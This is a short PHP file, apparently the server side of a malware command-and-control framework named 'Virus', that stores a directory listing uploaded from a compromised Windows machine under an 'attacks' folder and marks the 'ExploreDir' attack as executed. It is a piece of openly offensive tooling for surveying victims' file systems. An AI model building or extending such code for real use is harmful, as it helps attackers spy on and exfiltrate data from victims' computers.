<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir\ExploreDir $this */

$fileName = DATA_DIR . "/attacks/" . $this->getAttackId() . "/dirs.txt";
$this->requestData->moveFile("dirsFile", $fileName);
$this->usage()->setDisk(filesize($fileName))->saveState();
$this->setExecuted();
